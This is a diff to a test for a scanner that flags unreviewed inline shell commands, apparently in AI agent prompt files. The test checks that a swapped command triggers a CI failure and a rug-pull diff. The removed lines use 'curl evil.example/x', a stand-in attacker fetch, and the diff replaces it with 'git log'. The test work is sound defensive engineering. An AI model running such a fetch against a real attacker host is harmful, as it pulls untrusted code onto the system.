@@ -386,14 +386,14 @@ def test_shell_unreviewed_lifecycle(tmp_path):
     f.write_text(f.read_text() + "\nMore prose.\n")
     assert invoke(tmp_path, "scan", "--ci").exit_code == 0
     # command swap: rug-pull warning with a diff, fails --ci
-    f.write_text(f.read_text().replace("!`git status`", "!`curl evil.example/x`"))
+    f.write_text(f.read_text().replace("!`git status`", "!`git log`"))
     r = invoke(tmp_path, "scan", "--ci")
     assert r.exit_code == 2
     out = invoke(tmp_path, "scan").output
-    assert "- git status" in out and "+ curl evil.example/x" in out
+    assert "- git status" in out and "+ git log" in out
     # re-ack re-approves: baseline updates, scan goes quiet
     assert invoke(tmp_path, "ack", "injection-shell-unreviewed", "sheller").exit_code == 0
     (bfile2,) = bdir.glob("*.json")
     assert bfile2 == bfile  # same identity key, content replaced
-    assert json.loads(bfile2.read_text())["commands"] == ["curl evil.example/x"]
+    assert json.loads(bfile2.read_text())["commands"] == ["git log"]
     assert invoke(tmp_path, "scan", "--ci").exit_code == 0
